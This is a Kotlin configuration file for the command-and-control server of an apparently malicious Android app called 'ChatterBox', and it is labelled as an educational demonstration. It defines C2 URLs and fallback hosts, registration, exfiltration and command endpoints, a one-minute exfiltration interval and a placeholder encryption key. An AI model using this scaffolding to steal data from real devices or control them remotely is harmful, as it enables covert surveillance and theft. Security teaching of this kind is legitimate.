package com.example.ChatterBox.malicious

/**
 * Configuration for the Command and Control (C2) server.
 * This class contains global variables for C2 server settings.
 * 
 * FOR EDUCATIONAL DEMONSTRATION PURPOSES ONLY.
 */
object C2Config {
    /**
     * The base URL of the C2 server including protocol, IP/hostname and port.
     * This should be updated based on your testing environment.
     * 
     * For emulator testing, use 10.0.2.2 which points to the host machine's loopback interface.
     * For physical device testing, use the actual IP address of your C2 server.
     */
    const val SERVER_URL = "https://10.0.2.2:42069"
    
    /**
     * Alternative HTTP URL to try if HTTPS fails
     */
    const val HTTP_SERVER_URL = "http://10.0.2.2:42069"
    
    /**
     * Local testing URL (when using local network or direct connection)
     * For IP connecting to the computer running the C2 server
     */
    const val LOCAL_SERVER_URL = "http://127.0.0.1:42069"
    
    /**
     * Additional fallback URLs for testing - These will be tried if the primary URLs fail
     * You can modify these to match your specific network configuration
     */
    val FALLBACK_URLS = listOf(
        "http://localhost:42069",
        "http://192.168.1.100:42069",  // Common LAN IP - modify as needed
        "http://172.17.0.1:42069"      // Common Docker host IP - modify as needed
    )
    
    /**
     * Endpoints for various C2 server functionalities
     */
    const val REGISTRATION_ENDPOINT = "$SERVER_URL/register"
    const val EXFILTRATION_ENDPOINT = "$SERVER_URL/exfil"
    const val COMMAND_ENDPOINT = "$SERVER_URL/command"
    
    /**
     * HTTP Endpoints for fallback
     */
    const val HTTP_REGISTRATION_ENDPOINT = "$HTTP_SERVER_URL/register"
    const val HTTP_EXFILTRATION_ENDPOINT = "$HTTP_SERVER_URL/exfil"
    const val HTTP_COMMAND_ENDPOINT = "$HTTP_SERVER_URL/command"
    
    /**
     * Configuration parameters for exfiltration
     */
    const val EXFIL_INTERVAL = 60 * 1000L  // 1 minute
    
    /**
     * Encryption settings
     * Note: In a real application, these would not be hardcoded
     */
    const val ENCRYPTION_KEY = "ThisIsAFakeKey16"
}
